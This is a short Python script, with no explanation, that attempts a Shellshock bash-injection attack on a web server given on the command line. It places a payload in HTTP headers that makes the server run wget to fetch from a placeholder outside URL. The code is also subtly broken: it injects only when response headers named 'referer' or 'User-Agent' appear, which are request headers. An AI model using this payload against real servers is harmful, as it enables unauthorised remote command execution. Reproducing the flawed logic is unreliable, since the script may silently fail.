import requests
import sys
url = sys.argv[1]
payload = "() { :; }; /bin/bash -c '/usr/bin/wget <URL> >> /dev/null'"
headers ={}
r = requests.head(url)
for header in r.headers:
	if header == "referer" or header == "User-Agent": 
		headers[header] = payload	
	req = requests.post(url, headers=headers)
		